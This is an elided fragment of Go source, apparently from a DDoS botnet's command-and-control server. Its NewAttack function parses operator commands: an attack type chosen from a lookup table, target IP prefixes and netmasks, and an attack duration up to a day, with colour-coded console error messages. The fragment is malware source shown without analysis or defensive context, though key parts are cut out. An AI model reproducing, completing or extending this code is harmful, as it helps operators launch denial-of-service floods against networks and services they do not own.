...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    // Parse attack name
    if len(args) == 0 {
        return nil, errors.New("\x1b[1;33mmust specify an attack name")
    } else {
        if args[0] == "?" {
            validCmdList := "\r\n\x1b[1;33m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += cmdName + "\x1b[1;33m: " + atkInfo.attackDescription + ".\r\n"
            }
        ...
        if !exists {
            return nil, errors.New(fmt.Sprintf("\x1b[1;33m%s is not a valid attack command", args[0]))
        }
    ...
    // Parse targets
    if len(args) == 0 {
        return nil, errors.New("\x1b[1;33mmust specify prefix/netmask as targets")
    } else {
        if args[0] == "?" {
        ...
        for _,cidr := range cidrArgs {
            ...
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("\x1b[1;31mfailed to parse IP address, near %s", cidr))
            }
    ...
    if len(args) == 0 {
        return nil, errors.New("\x1b[1;33mmust specify an attack duration")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\x1b[1;33mduration of the attack, in seconds")
        }
        duration, err := strconv.Atoi(args[0])
        if err != nil || duration == 0 || duration > 86400 {
            return nil, errors.New(fmt.Sprintf("\x1b[1;33minvalid attack duration, near %s. Duration must be between 0 and 86400 seconds", args[0]))
        }
